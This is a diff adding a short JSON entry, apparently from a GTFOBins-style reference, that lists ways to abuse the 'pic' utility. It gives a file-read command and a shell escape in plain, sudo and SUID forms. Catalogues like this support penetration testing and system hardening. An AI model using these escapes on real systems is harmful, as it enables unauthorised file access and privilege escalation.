@@ -1,0 +1,25 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "description": "The output is prefixed with a some content as a header.",
+        "code": "LFILE=file_to_read\npic $LFILE\n"
+      }
+    ],
+    "shell": [
+      {
+        "code": "pic -U\n.PS\nsh X sh X\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo pic -U\n.PS\nsh X sh X\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./pic -U\n.PS\nsh X sh X\n"
+      }
+    ]
+  }
+}
